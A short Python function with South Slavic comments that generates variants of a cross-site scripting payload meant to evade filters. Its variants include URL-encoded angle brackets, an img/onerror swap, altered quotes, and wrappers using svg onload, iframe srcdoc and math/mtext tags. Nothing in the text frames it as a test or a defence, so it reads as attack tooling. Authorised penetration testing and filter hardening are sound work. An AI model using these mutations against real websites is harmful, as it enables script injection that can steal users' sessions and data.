def mutate_payload(base):
    mutations = []

    # Osnovne mutacije
    mutations.append(base)
    mutations.append(base.replace("<", "%3C").replace(">", "%3E"))
    mutations.append(base.replace("script", "img/onerror"))
    mutations.append(base.replace('"', "'"))
    mutations.append(f'"><svg/onload={base}>')
    mutations.append(f'<iframe srcdoc="{base}">')
    mutations.append(f'<math><mtext>{base}</mtext></math>')

    return list(set(mutations))  # uklanja duplikate
